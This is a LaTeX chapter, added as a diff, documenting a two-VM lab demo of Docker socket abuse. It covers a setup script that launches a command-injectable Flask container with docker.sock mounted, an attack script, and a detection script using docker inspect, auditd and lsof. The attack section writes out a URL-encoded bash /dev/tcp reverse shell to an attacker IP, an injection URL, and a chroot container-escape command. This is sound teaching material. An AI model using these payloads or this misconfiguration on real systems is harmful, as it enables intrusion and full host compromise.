@@ -1,0 +1,313 @@
+\chapter{Script Documentation}
+
+\section{setup.sh --- Full Walkthrough}
+
+\texttt{setup.sh} runs on VM1. Its job is to build the vulnerable Docker image and launch the misconfigured container that the attack chain targets. Every block below creates or depends on a condition that the attacker later exploits.
+
+\subsection{Dependency Checks}
+
+The script opens with \texttt{set -e}, which instructs Bash to abort on the first non-zero exit code. This prevents a partial setup where some steps succeed and later steps silently fail against a broken environment.
+
+Before any Docker work, two file existence guards run:
+
+\begin{lstlisting}[language=bash]
+[ -f "./host/app.py" ]     || err "app.py not found"
+[ -f "./host/Dockerfile" ] || err "Dockerfile not found"
+\end{lstlisting}
+
+Both files are required for the image build. If the script is invoked from the wrong working directory, it aborts immediately rather than proceeding to a build that would fail with a confusing error.
+
+Docker availability is checked and auto-installed if absent:
+
+\begin{lstlisting}[language=bash]
+command -v docker || apt-get install -y docker.io \
+    && systemctl enable --now docker
+\end{lstlisting}
+
+\texttt{command -v} is the POSIX-compliant binary lookup, preferred over \texttt{which} because it is a shell built-in and does not depend on \texttt{PATH} containing \texttt{/usr/bin}. \texttt{docker.io} is the Debian/Ubuntu package name for the Docker engine. \texttt{systemctl enable --now} starts the daemon immediately and registers it to start on subsequent boots in a single command. On success the script prints the installed version via \texttt{docker --version}.
+
+The script also defines three output functions --- \texttt{banner}, \texttt{ok}, and \texttt{err} --- that wrap ANSI escape codes. These have no functional role in the attack or detection; they exist solely to make output readable during a live demonstration.
+
+\subsection{Docker Build Flow}
+
+The image is built with:
+
+\begin{lstlisting}[language=bash]
+docker build -t netdiag ./host/
+\end{lstlisting}
+
+The \texttt{-t netdiag} flag tags the resulting image as \texttt{netdiag:latest}. The \texttt{./host/} argument is the build context --- the daemon receives a tar of this directory, which at minimum contains \texttt{app.py} and \texttt{Dockerfile}.
+
+The daemon executes each Dockerfile instruction as a separate layer:
+
+\begin{itemize}
+    \item \texttt{FROM python:3.11-slim} pulls the base image from Docker Hub if not already in the local cache and sets it as the starting layer.
+    \item \texttt{COPY . .} copies the build context (including \texttt{app.py}) into the image at the current \texttt{WORKDIR}.
+    \item \texttt{RUN pip install flask} spawns a temporary container, runs the install, and commits the result as a new layer.
+\end{itemize}
+
+The final image is stored in \texttt{/var/lib/docker/overlay2/} on the host. Before building, the script checks for and removes any previously named container to ensure idempotent re-runs:
+
+\begin{lstlisting}[language=bash]
+docker ps -a --format '{{.Names}}' \
+    | grep -q "^netdiag-app$" \
+    && docker rm -f netdiag-app
+\end{lstlisting}
+
+The \texttt{--format '\{\{.Names\}\}'} Go template avoids parsing the human-readable header line. \texttt{rm -f} force-removes the container even if it is in a running state. This block makes the script safe to re-run without manual cleanup between attempts.
+
+\subsection{The Misconfigured \texttt{docker run} Command}
+
+The following command creates the environment the attacker exploits:
+
+\begin{lstlisting}[language=bash]
+docker run -d \
+    -p 5000:5000 \
+    -v /var/run/docker.sock:/var/run/docker.sock \
+    --name netdiag-app \
+    netdiag
+\end{lstlisting}
+
+Each flag carries a distinct consequence:
+
+\begin{itemize}
+    \item \textbf{\texttt{-d}}: Detached mode. The container runs as a background process; the terminal returns immediately. The container persists until explicitly stopped.
+    \item \textbf{\texttt{-p 5000:5000}}: Docker creates an \texttt{iptables} DNAT rule that forwards TCP traffic arriving on host port 5000 to port 5000 inside the container. This is what makes the Flask application reachable from VM2.
+    \item \textbf{\texttt{-v /var/run/docker.sock:/var/run/docker.sock}}: This is the misconfiguration. It bind-mounts the host Docker daemon socket into the container at the identical path. Both sides reference the same inode. Any process inside the container that can open this socket can send API commands to the host daemon as if it were running natively on the host. Since the Flask process runs as \texttt{root} inside the container, it has immediate read/write access.
+    \item \textbf{\texttt{--name netdiag-app}}: Assigns a deterministic name to the container. \texttt{detect.sh} later references this name to run \texttt{docker inspect}.
+\end{itemize}
+
+The script concludes by printing the application URL (\texttt{http://192.168.98.4:5000}), a pre-formed injection test URL (\texttt{http://192.168.98.4:5000/ping?host=8.8.8.8;id}), and an instruction to proceed with \texttt{attack.sh} on VM2.
+
+\begin{figure}[h]
+\centering
+\vspace{3cm}
+\caption{setup.sh execution flow: dependency checks, image build, and misconfigured container launch}
+\end{figure}
+
+% ---
+
+\section{attack.sh --- Full Walkthrough}
+
+\texttt{attack.sh} runs on VM2. It drives each phase of the attack chain in sequence, pausing between steps so the operator can observe results and control pacing during a live demonstration. It does not fully automate post-exploitation; the escape itself requires manual commands inside the reverse shell.
+
+At the top of the script, four variables must be set before execution:
+
+\begin{lstlisting}[language=bash]
+VICTIM_IP="192.168.98.4"
+ATTACKER_IP="192.168.98.5"
+PORT=4444
+TARGET="http://${VICTIM_IP}:5000"
+\end{lstlisting}
+
+The \texttt{pause()} function calls \texttt{read -r} and blocks until the operator presses Enter, giving control over when each phase fires. This is the only interactivity in the script.
+
+\subsection{RCE Confirmation via curl}
+
+The first block confirms that remote code execution is available before attempting the reverse shell:
+
+\begin{lstlisting}[language=bash]
+RESPONSE=$(curl -s --max-time 10 \
+    "${TARGET}/ping?host=8.8.8.8%3Bid")
+echo "$RESPONSE" | grep -q "uid=0" || exit 1
+\end{lstlisting}
+
+\texttt{\%3B} is the URL-encoded form of the semicolon character. The Flask server decodes it before the value reaches \texttt{os.popen()}, which passes the result to \texttt{/bin/sh -c}. The shell interprets the semicolon as a command separator, executing \texttt{ping -c 3 8.8.8.8} and then \texttt{id}. Because the Flask process runs as root inside the container, \texttt{id} returns a line containing \texttt{uid=0}.
+
+\texttt{--max-time 10} prevents the \texttt{curl} call from hanging indefinitely if the victim is unreachable. \texttt{grep -q "uid=0"} performs a silent match; if the string is absent the script exits with a non-zero code rather than proceeding to the reverse shell phase with a broken assumption.
+
+On success the script prints the raw response lines containing \texttt{uid=} as visual proof for the demonstration audience.
+
+\subsection{Reverse Shell Automation}
+
+The listener is launched in a new terminal window. The script tries multiple terminal emulators in order:
+
+\begin{lstlisting}[language=bash]
+command -v xterm \
+    && xterm -e "nc -lvnp ${PORT}" &
+command -v gnome-terminal \
+    && gnome-terminal -- bash -c \
+       "nc -lvnp ${PORT}; exec bash" &
+# fallback: print manual instruction
+\end{lstlisting}
+
+The trailing \texttt{\&} backgrounds each terminal process so the script continues rather than blocking. A \texttt{sleep 1} follows to ensure the listener is bound before the payload fires.
+
+The payload is then delivered via \texttt{curl}:
+
+\begin{lstlisting}[language=bash]
+PAYLOAD="bash+-c+'bash+-i+>%26+/dev/tcp/${ATTACKER_IP}/${PORT}+0>%261'"
+curl -s --max-time 5 \
+    "${TARGET}/ping?host=8.8.8.8%3B${PAYLOAD}" \
+    &>/dev/null &
+\end{lstlisting}
+
+The encoding conventions in the payload:
+\begin{itemize}
+    \item \texttt{+} encodes spaces in a query string value, which the server decodes before passing to the shell.
+    \item \texttt{\%26} encodes \texttt{\&}; \texttt{\%261} encodes \texttt{\&1}, reconstructing the \texttt{>\&} and \texttt{0>\&1} redirections required for the Bash TCP redirect shell.
+    \item \texttt{--max-time 5}: Flask's \texttt{os.popen().read()} blocks while the reverse shell is active, which would hang \texttt{curl} indefinitely. The timeout forces \texttt{curl} to terminate without waiting for a response.
+    \item \texttt{\&>/dev/null \&}: the entire \texttt{curl} invocation is backgrounded and its output discarded. The reverse shell appears in the listener window rather than on the script's terminal.
+\end{itemize}
+
+\subsection{Post-Exploitation Instruction Block}
+
+The script does not automate the escape. After the reverse shell connects, Step 3 prints a block of commands for the operator to run manually inside the shell. This is intentional: automating the escape would prevent the operator from inspecting intermediate states during a demonstration.
+
+Shell stabilisation commands are printed first:
+
+\begin{lstlisting}[language=bash]
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z, then on attacker: stty raw -echo; fg, then Enter twice
+\end{lstlisting}
+
+Socket verification:
+
+\begin{lstlisting}[language=bash]
+ls -la /var/run/docker.sock
+\end{lstlisting}
+
+Docker CLI install and escape container:
+
+\begin{lstlisting}[language=bash]
+apt-get update && apt-get install -y docker.io
+docker -H unix:///var/run/docker.sock run -d \
+    -v /:/hostfs --rm alpine \
+    chroot /hostfs sh -c 'echo pwned > /tmp/escaped.txt'
+\end{lstlisting}
+
+Verification:
+
+\begin{lstlisting}[language=bash]
+cat /tmp/escaped.txt   # run on VM1
+\end{lstlisting}
+
+The script closes by directing the operator to run \texttt{detect.sh} on VM1, connecting the attack phase to the detection phase documented in Section~\ref{sec:detect}.
+
+\begin{figure}[h]
+\centering
+\vspace{3cm}
+\caption{attack.sh phase sequence: RCE confirmation, reverse shell delivery, and manual escape instructions}
+\end{figure}
+
+% ---
+
+\section{detect.sh --- Full Walkthrough}
+\label{sec:detect}
+
+\texttt{detect.sh} runs on VM1 after the attack. It executes four checks in order, each targeting a different layer of evidence: the escape artifact, the container configuration, kernel-level audit events, and live socket handles. Each check is independent; a positive result on any one of them is sufficient to flag the host as compromised or misconfigured.
+
+\subsection{Checking for the Escape Artifact}
+
+\begin{lstlisting}[language=bash]
+[ -f /tmp/escaped.txt ] && cat /tmp/escaped.txt
+\end{lstlisting}
+
+\texttt{/tmp/escaped.txt} is the most direct indicator of compromise in this scenario. It was written to the host filesystem by a process running inside a container --- an action that should be impossible without an escape. The file contains the string \texttt{pwned}, written by the \texttt{chroot /hostfs sh -c 'echo pwned > /tmp/escaped.txt'} command in the escape step.
+
+A positive result triggers a \texttt{warn "HOST IS COMPROMISED"} message in red.
+
+The limitation of this check is significant: it depends on an attacker-controlled artifact. A real attacker would delete the file after confirming the escape succeeded. Absence of the file does not imply safety. The check is valuable in the demonstration context precisely because its output is unambiguous for an audience, but it should not be the primary detection mechanism in a production environment.
+
+\subsection{Inspecting Mounts with docker inspect}
+
+\begin{lstlisting}[language=bash]
+docker inspect netdiag-app | python3 -c "
+import sys, json
+data = json.load(sys.stdin)
+mounts = data[0].get('Mounts', [])
+for m in mounts:
+    print('Source:', m.get('Source'))
+    print('Dest  :', m.get('Destination'))
+"
+\end{lstlisting}
+
+\texttt{docker inspect} retrieves the full JSON state record for the named container from the Docker daemon. The \texttt{Mounts} array in that record lists every bind mount and volume attached to the container, including the source path on the host and the destination path inside the container.
+
+The Python one-liner parses the JSON inline and prints each source/destination pair. The script then pipes this output through \texttt{grep -q "docker.sock"} to flag the critical misconfiguration.
+
+This check is effective both reactively (after an incident) and proactively (as a routine audit). Unlike the artifact check, it does not rely on the attacker leaving evidence behind --- the misconfiguration is visible in daemon state as long as the container exists, whether or not an attack has occurred. \texttt{docker inspect} reads from daemon memory and does not require the container to be running.
+
+\subsection{Setting Up auditd Rules}
+
+\texttt{detect.sh} installs \texttt{auditd} if absent and starts the daemon:
+
+\begin{lstlisting}[language=bash]
+apt-get install -y auditd -qq \
+    && systemctl enable --now auditd
+\end{lstlisting}
+
+It then sets a file watch rule:
+
+\begin{lstlisting}[language=bash]
+auditctl -w /var/run/docker.sock -p rwxa -k docker_sock
+\end{lstlisting}
+
+Flag breakdown:
+\begin{itemize}
+    \item \texttt{-w /var/run/docker.sock}: watch this specific filesystem path.
+    \item \texttt{-p rwxa}: trigger on read, write, execute, and attribute-change operations.
+    \item \texttt{-k docker\_sock}: tag every matching log entry with this key, enabling fast retrieval via \texttt{ausearch -k docker\_sock}.
+\end{itemize}
+
+This rule is runtime-only. It is lost on reboot unless written to a persistent rules file:
+
+\begin{lstlisting}
+# /etc/audit/rules.d/docker.sock.rules
+-w /var/run/docker.sock -p rwxa -k docker_sock
+\end{lstlisting}
+
+\texttt{auditd} hooks into the Linux kernel's \texttt{audit} subsystem. Every process that opens, reads, writes, or changes attributes on the socket path generates a log record containing the PID, UID, timestamp, and syscall that triggered the event. Because \texttt{auditd} runs on the host, it sees all container processes by their host PIDs regardless of namespace boundaries.
+
+A key limitation applies to the demonstration: if the attack ran before \texttt{auditd} was set up, there are no retroactive log entries. The rule only captures future accesses. This illustrates why proactive deployment of \texttt{auditd} rules --- before an attack occurs --- is necessary for \texttt{auditd} to serve as a useful forensic source.
+
+\subsection{Parsing Audit Logs}
+
+\begin{lstlisting}[language=bash]
+ausearch -k docker_sock 2>/dev/null | tail -20
+\end{lstlisting}
+
+\texttt{ausearch} queries \texttt{/var/log/audit/audit.log} and returns all records tagged with the specified key. Each event produces a group of related record types:
+
+\begin{itemize}
+    \item \texttt{type=SYSCALL}: the syscall number, PID, UID, and whether the call succeeded.
+    \item \texttt{type=PATH}: the filesystem path that was accessed.
+    \item \texttt{type=PROCTITLE}: the command line of the process that triggered the event, encoded in hex.
+\end{itemize}
+
+The output is piped to \texttt{tail -20} to limit volume during the demonstration. The full log at \texttt{/var/log/audit/audit.log} is available for complete forensic review.
+
+\subsection{Live Socket Monitoring with lsof}
+
+\begin{lstlisting}[language=bash]
+lsof /var/run/docker.sock
+\end{lstlisting}
+
+\texttt{lsof} reads \texttt{/proc/*/fd/} symlinks to enumerate every process that currently has a file descriptor open on the specified path. It requires no kernel module. The output columns include \texttt{COMMAND}, \texttt{PID}, \texttt{USER}, \texttt{FD}, \texttt{TYPE}, and \texttt{NAME}.
+
+The expected baseline output contains only the \texttt{dockerd} process. Any additional entry --- particularly one associated with an unexpected binary or a PID that maps to a container process --- indicates active socket abuse.
+
+\texttt{lsof} and \texttt{auditd} are complementary: \texttt{lsof} provides a live snapshot of who holds the socket open right now, while \texttt{auditd} provides a historical record of every past access. Neither alone is sufficient.
+
+The script closes with a summary table:
+
+\begin{center}
+\begin{tabular}{ll}
+\hline
+\textbf{Tool} & \textbf{What It Catches} \\
+\hline
+File check & Escape artifact (post-attack) \\
+\texttt{docker inspect} & Socket bind-mount misconfiguration \\
+\texttt{auditd} & Any process touching socket (ongoing) \\
+\texttt{lsof} & Live processes with socket handle open \\
+Falco* & Runtime rules --- not installed in demo \\
+\hline
+\end{tabular}
+\end{center}
+
+\begin{figure}[h]
+\centering
+\vspace{3cm}
+\caption{detect.sh check sequence and the evidence layer each tool targets}
+\end{figure}
